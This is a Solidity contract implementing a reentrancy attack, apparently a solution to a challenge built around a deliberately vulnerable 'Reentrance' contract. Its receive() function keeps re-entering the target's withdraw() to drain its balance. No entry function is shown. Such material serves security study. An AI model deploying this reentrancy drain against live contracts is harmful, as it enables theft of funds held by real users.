// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttacker {
    IReentrance private reentrance;

    constructor(address _reentranceAddress) public {
        reentrance = IReentrance(_reentranceAddress);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(1 ether);
        }
    }
}
